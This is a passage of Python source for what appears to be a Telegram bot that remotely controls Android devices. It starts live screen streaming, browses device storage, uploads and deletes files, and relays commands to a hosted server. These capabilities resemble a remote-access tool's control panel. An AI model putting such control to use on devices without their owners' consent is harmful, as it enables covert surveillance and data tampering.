        device_id = getattr(self, 'selected_device', None)
        if not device_id:
            await query.edit_message_text("❌ No device selected.")
            return

        await self._send_device_command(device_id, 'live_screen', {}, query)
        await query.edit_message_text("📺 Live screen viewing started!\n\nThe device will stream screen updates.", parse_mode='Markdown')

    async def _handle_upload_button(self, query):
        """Handle upload file button - requires user interaction"""
        await query.edit_message_text("⬆️ *Upload File*\n\n"
                                         "Please reply with the file you want to upload to the device.\n\n"
                                         "Note: After selecting the file, I'll ask for the destination path.", parse_mode='Markdown')

    async def _handle_navigate_button(self, query):
        """Handle file navigation button"""
        device_id = getattr(self, 'selected_device', None)
        if not device_id:
            await query.edit_message_text("❌ No device selected.")
            return

        await self._send_device_command(device_id, 'navigate', {'path': '/storage/emulated/0'}, query)
        await query.edit_message_text("📁 File browser opened!\n\nCommand sent to explore device files.", parse_mode='Markdown')

    async def _handle_delete_button(self, query):
        """Handle delete file button"""
        await query.edit_message_text("🗑️ *Delete File*\n\n"
                                         "Please reply with the full path of the file you want to delete.\n\n"
                                         "Example: `/storage/emulated/0/Documents/file.txt`", parse_mode='Markdown')

    # Override the send_device_command for query objects
    async def _query_send_device_command(self, device_id, command, params, query):
        """Send command to device via HTTP (for query objects)"""
        try:
            import requests

            device = self.device_manager.get_device(device_id)
            if not device:
                await query.edit_message_text(f"❌ Device `{device_id}` not found.", parse_mode='Markdown')
                return

            response = requests.post(
                f'https://bot-ugkn.onrender.com/command',
                json={
                    'device_id': device_id,
                    'command': command,
                    'params': params,
                    'chat_id': str(query.from_user.id),
                    'timestamp': str(query.message.date)
                }
            )

            return response.status_code == 200

        except Exception as e:
            print(f'Error sending device command: {e}')
            return False
